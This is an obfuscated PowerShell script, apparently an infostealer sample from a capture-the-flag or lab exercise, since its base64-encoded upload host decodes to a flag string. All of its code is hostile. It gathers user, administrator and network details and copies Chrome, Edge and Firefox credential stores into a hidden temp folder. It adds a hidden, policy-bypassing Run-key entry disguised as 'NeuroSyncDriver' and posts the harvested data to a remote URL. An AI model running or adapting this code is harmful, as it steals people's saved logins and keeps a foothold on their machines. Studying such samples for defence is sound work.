$ErrorActionPreference = 'SilentlyContinue'

$global:_0x1a2c = "U2F2b1NlY3t0aDNfY3liM3Jr"
$global:_0x9d7c = "ZHVja193MWxsX2IzX2I0Y2shfQ=="
$global:_0x3e5b = $global:_0x1a2c + $global:_0x9d7c

$global:_0x4f21 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($global:_0x3e5b))
$global:_0x1192 = "http://" + $global:_0x4f21 + "/v2/sync/relay"
$global:_0x92a1 = "$env:TEMP\.ns_sync_" + (Get-Random -Minimum 1000 -Maximum 9999)

if (!(Test-Path $global:_0x92a1)) { New-Item -ItemType Directory -Path $global:_0x92a1 -Force | Out-Null }

function _0x8821() {
    $log = "$global:_0x92a1\sysinfo.dat"
    $info = @{
        "TS" = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        "USR" = "$env:USERDOMAIN\$env:USERNAME"
        "OS" = (Get-WmiObject Win32_OperatingSystem).Caption
        "ARCH" = $env:PROCESSOR_ARCHITECTURE
        "NET" = (Get-NetIPAddress -AddressFamily IPv4 | Select-Object -ExpandProperty IPAddress) -join ","
    }
    $info | Out-File -FilePath $log
    "--- N ---" >> $log
    net user >> $log
    "--- Gn ---" >> $log
    net localgroup administrators >> $log
}

function _0x551a() {
    $vault = "$global:_0x92a1\vault"
    if (!(Test-Path $vault)) { New-Item -ItemType Directory -Path $vault -Force | Out-Null }
    
    $targets = @(
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data",
        "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Web Data",
        "$env:APPDATA\Mozilla\Firefox\Profiles\*"
    )
    
    foreach ($t in $targets) {
        if (Test-Path $t) {
            $name = Split-Path $t -Leaf
            $parent = Split-Path $t -Parent | Split-Path -Leaf
            Copy-Item $t -Destination "$vault\$parent_$name" -ErrorAction SilentlyContinue
        }
    }
}

function _0x332b() {
    $r = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $k = "NeuroSyncDriver"
    $v = "powershell.exe -w hidden -ep bypass -f $global:_0x92a1\sync.ps1"
    Set-ItemProperty -Path $r -Name $k -Value $v -ErrorAction SilentlyContinue
}

function _0x9901() {
    try {
        $body = gc -Path "$global:_0x92a1\sysinfo.dat" -Raw
        iwr -Uri $global:_0x1192 -Method Post -Body $body -UseBasicParsing -TimeoutSec 5 | Out-Null
    } catch {}
}

_0x8821
_0x551a
_0x332b
_0x9901

